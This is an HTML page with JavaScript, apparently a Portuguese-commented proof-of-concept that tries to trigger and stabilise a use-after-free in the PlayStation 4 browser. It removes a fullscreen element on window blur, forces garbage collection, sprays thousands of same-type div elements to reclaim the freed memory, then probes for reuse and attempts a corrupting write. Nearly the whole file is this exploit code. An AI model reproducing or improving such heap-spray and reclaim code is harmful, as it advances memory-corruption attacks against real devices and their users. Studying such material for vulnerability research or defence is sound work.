
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF Stabilization Test</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 UAF - Deterministic Reclaim</h2>
<button onclick="runTest()">Run Test</button>

<div id="log" style="margin-top:20px;"></div>

<script>
function log(msg) {
    try { console.log(msg); } catch(e){}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

// ==========================
// HEAP PRESSURE (GC trigger)
// ==========================
function pressureGC() {
    for (let i = 0; i < 50; i++) {
        let tmp = new Array(100000).fill(i);
    }
}

// ==========================
// FULLSCREEN SETUP
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "TARGET_OBJECT";
    fsTarget.style.position = "absolute";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.background = "black";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 🔥 DETERMINISTIC RECLAIM
// ==========================
function aggressiveReclaim() {
    log("[*] Reclaim start");

    // Fase 1 - churn
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // Fase 2 - spray CONTROLADO (mesmo tipo)
    for (let i = 0; i < 20000; i++) {
        let el = document.createElement("div");

        el.innerHTML = "REUSE_EL_" + i;
        el.style.position = "absolute";
        el.style.width = "100%";
        el.style.height = "100%";

        document.body.appendChild(el);
    }

    log("[*] Reclaim end");
}

// ==========================
// DETECÇÃO REAL
// ==========================
function detectCorruption(fsTarget) {
    log("---- CHECK ----");

    try {
        let html = fsTarget.innerHTML;

        log("[CHECK] innerHTML = " + html);

        if (html && html.includes("REUSE_EL_")) {
            log("[!!!] POSSÍVEL REUSE DETECTADO");
        }

    } catch(e) {
        log("[UAF] innerHTML crash: " + e);
    }

    try {
        fsTarget.innerHTML = "CORRUPTED_WRITE_TEST";
        log("[WRITE] sucesso");
    } catch(e) {
        log("[UAF WRITE FAIL] " + e);
    }
}

// ==========================
// TRIGGER REFORÇADO
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
        }

    } catch(e) {
        log("[ERRO] " + e);
    }

    // 💣 Alinhamento crítico
    pressureGC();

    // 🔥 Reclaim síncrono pesado
    for (let i = 0; i < 5; i++) {
        aggressiveReclaim();
    }

    // 🔬 Check
    setTimeout(() => detectCorruption(fsTarget), 100);
}

// ==========================
// LOOP DE TENTATIVA
// ==========================
function multiTrigger(fsTarget) {
    for (let i = 0; i < 10; i++) {
        setTimeout(() => trigger(fsTarget), i * 200);
    }
}

// ==========================
// MAIN
// ==========================
function runTest() {
    const logDiv = document.getElementById("log");
    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";

    log("[*] Start");

    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");

        setTimeout(() => multiTrigger(fsTarget), 2000);
    };
}
</script>

</body>
</html>
